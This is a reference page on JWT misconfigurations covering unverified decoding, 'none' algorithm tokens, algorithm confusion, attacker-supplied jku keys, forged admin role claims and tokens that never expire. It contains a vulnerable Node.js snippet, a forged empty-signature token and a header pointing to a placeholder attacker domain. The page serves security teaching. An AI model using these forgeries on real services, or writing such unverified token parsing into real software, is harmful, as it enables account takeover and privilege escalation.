# JWT Misconfiguration

## Table of Contents

- [Account Takeover](#account-takeover)
- [Privilege Escalation](#privilege-escalation)
- [Persistent Access](#persistent-access)

## Account Takeover

### A token for any user can be forged, because the service accepts signatures it should reject.

- Parsing the token without verifying the signature
    ```javascript
    // decode() only reads the claims; verify() is the function that checks the signature
    const claims = jwt.decode(req.cookies.token);
    const user = await User.findById(claims.sub);
    ```

- Accepting the `none` algorithm [^1]
    1. Header and payload of a token issued to the attacker
        ```json
        {"alg":"HS256","typ":"JWT"}
        {"sub":"[ATTACKER-USER-ID]"}
        ```

    2. Forged token, with an empty signature
        ```text
        eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJbVklDVElNLVVTRVItSURdIn0.
        ```
        ```json
        {"alg":"none","typ":"JWT"}
        {"sub":"[VICTIM-USER-ID]"}
        ```

- Signing with the public key as an HMAC secret (algorithm confusion) [^1]
    - The service verifies RS256 tokens with its RSA public key, which is often published at `/.well-known/jwks.json`. The attacker changes `alg` to `HS256` and signs the token using that public key as the HMAC secret. A library that takes the algorithm from the token header then checks the HMAC with the same key and accepts it.

- Supplying the verification key in the header [^2]
    ```json
    {"alg":"RS256","typ":"JWT","jku":"https://[ATTACKER-DOMAIN]/jwks.json","kid":"attacker-key"}
    ```
    The service fetches the key set from the URL in the token and verifies the signature with the attacker's own key.

## Privilege Escalation

### Claims that the service trusts for authorization, such as a role, can be set to any value once a token can be forged.

- Granting the administrative role
    ```json
    {"sub":"[ATTACKER-USER-ID]","role":"admin"}
    ```
    Any of the forgery cases above applies. A weak HMAC secret has the same effect, as described in [Weak Credential Management](./Weak_Credential_Management.md).

## Persistent Access

### A stolen token stays valid indefinitely, because it never expires and the service keeps no record that would let it be revoked.

- Issuing tokens without an expiry
    ```json
    {"sub":"[VICTIM-USER-ID]","iat":1700000000}
    ```
    Without an `exp` claim, or when the service never checks it, a token captured through XSS or a log file keeps working after the victim signs out or changes their password.

[^1]: Applies when the library selects the verification algorithm from the token's `alg` header instead of a fixed list set by the service.
[^2]: Applies when the `jku`, `x5u`, or `jwk` header is trusted without being restricted to the service's own keys.
